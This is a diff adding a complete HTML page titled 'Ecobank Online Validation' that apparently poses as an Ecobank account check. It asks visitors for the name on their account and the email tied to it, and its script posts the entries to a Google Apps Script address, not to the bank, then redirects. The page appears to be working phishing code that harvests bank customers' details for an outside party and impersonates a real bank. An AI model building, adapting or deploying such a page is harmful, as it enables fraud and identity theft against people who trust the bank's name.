@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ecobank Online Validation</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(to bottom right, #0073cf, #00a859);
+      margin: 0;
+      padding: 0;
+      color: #222;
+    }
+
+    .header {
+      text-align: center;
+      background: #fff;
+      padding: 25px 0;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    .header h1 {
+      color: #0073cf;
+      font-size: 1.8em;
+      margin: 0;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .form-container {
+      max-width: 420px;
+      background: #fff;
+      margin: 40px auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+    }
+
+    .form-container p.description {
+      text-align: center;
+      font-size: 1rem;
+      color: #333;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-top: 20px;
+      margin-bottom: 8px;
+    }
+
+    .name-fields {
+      display: flex;
+      gap: 10px;
+    }
+
+    input[type="text"],
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 0.95rem;
+      box-sizing: border-box;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 30px;
+      background-color: #00A859;
+      color: #fff;
+      font-size: 1.1rem;
+      border: none;
+      padding: 14px 0;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #008f4a;
+    }
+
+    .loading-message {
+      display: none;
+      text-align: center;
+      font-weight: bold;
+      margin-top: 20px;
+      color: #0073cf;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 3px solid #0073cf;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <h1>Ecobank Online Validation</h1>
+  </div>
+
+  <!-- Form -->
+  <div class="form-container">
+    <p class="description">
+      Validate your account services for smooth transactional purposes and easy accessibility.
+    </p>
+
+    <form id="ecobankForm" name="ecobankForm">
+      <label>Name on Account:</label>
+      <div class="name-fields">
+        <input type="text" name="first_name" placeholder="First Name" required />
+        <input type="text" name="last_name" placeholder="Last Name" required />
+      </div>
+
+      <label>Email connected to Account:</label>
+      <input type="email" name="email" placeholder="example@example.com" required />
+
+      <button type="submit" id="submitBtn">Submit</button>
+      <div class="loading-message" id="loadingMessage">
+        <span class="spinner"></span>Submitting...
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxMXMvDEsoQbYZPar9CA-qeH-5wBOwxWudKIYAJeuMcKUJRYTe3iRtRVJNVKL2ig49B/exec";
+    const form = document.forms['ecobankForm'];
+    const loadingMessage = document.getElementById('loadingMessage');
+    const submitBtn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+
+      loadingMessage.style.display = 'block';
+      submitBtn.disabled = true;
+
+      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+        .then(response => {
+          loadingMessage.style.display = 'none';
+          submitBtn.disabled = false;
+          form.reset();
+
+          // Redirect to thankyou.html after 1 second
+          setTimeout(() => {
+            window.location.href = "index.html";
+          }, 1000);
+        })
+        .catch(error => {
+          loadingMessage.style.display = 'none';
+          submitBtn.disabled = false;
+          alert('⚠️ Error submitting form. Please try again later.');
+          console.error('Error!', error.message);
+        });
+    });
+  </script>
+
+</body>
+</html>
